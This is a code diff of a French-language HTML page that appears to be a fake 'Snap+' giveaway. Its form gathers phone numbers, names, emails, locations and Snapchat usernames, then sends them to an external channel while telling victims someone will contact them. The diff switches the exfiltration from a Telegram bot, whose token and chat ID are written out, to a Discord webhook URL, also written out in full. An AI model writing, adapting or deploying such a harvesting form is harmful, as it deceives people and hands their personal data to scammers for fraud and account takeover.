@@ -135,8 +135,7 @@
   </div>
 
   <script>
-    const TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
-    const CHAT_ID = "-1002810249796";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
 
     function showStep2() {
       const phoneInput = document.querySelector('[name="telephone"]');
@@ -152,35 +151,32 @@
       e.preventDefault();
       const data = new FormData(this);
 
-      const message = `
-━━━━━━━━━━━━━━━━━━━━━━━
-🎁 *NOUVELLE PARTICIPATION SNAP+* 🎁
-━━━━━━━━━━━━━━━━━━━━━━━
+      // Construire l'objet embed pour Discord
+      const embed = {
+        title: "🎁 Nouvelle participation Snap+",
+        color: 0xA54FFB,
+        fields: [
+          { name: "📞 Téléphone", value: data.get("telephone") || "N/A", inline: true },
+          { name: "👤 Nom", value: data.get("nom") || "N/A", inline: true },
+          { name: "👤 Prénom", value: data.get("prenom") || "N/A", inline: true },
+          { name: "📧 Email", value: data.get("email") || "N/A", inline: false },
+          { name: "🏙️ Ville", value: data.get("ville") || "N/A", inline: true },
+          { name: "📍 Département", value: data.get("departement") || "N/A", inline: true },
+          { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true }
+        ],
+        footer: {
+          text: `Reçu le ${new Date().toLocaleString("fr-FR")}`,
+        },
+        timestamp: new Date(),
+      };
 
-📞 *Téléphone* : \`${data.get("telephone")}\`
-👤 *Nom* : \`${data.get("nom")}\`
-👤 *Prénom* : \`${data.get("prenom")}\`
-📧 *Email* : \`${data.get("email")}\`
-🏙️ *Ville* : \`${data.get("ville")}\`
-📍 *Département* : \`${data.get("departement")}\`
-👻 *Snapchat* : \`${data.get("snap")}\`
-
-━━━━━━━━━━━━━━━━━━━━━━━
-🕓 _Reçu le ${new Date().toLocaleString("fr-FR")}_
-━━━━━━━━━━━━━━━━━━━━━━━
-`;
-
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "Markdown",
-        }),
+        body: JSON.stringify({ embeds: [embed] }),
       })
-        .then((res) => res.json())
-        .then(() => {
+        .then((res) => {
+          if (!res.ok) throw new Error("Erreur lors de l'envoi");
           alert("Merci ! Une personne vous contactera bientôt.");
           this.reset();
           document.getElementById("step1").style.display = "block";
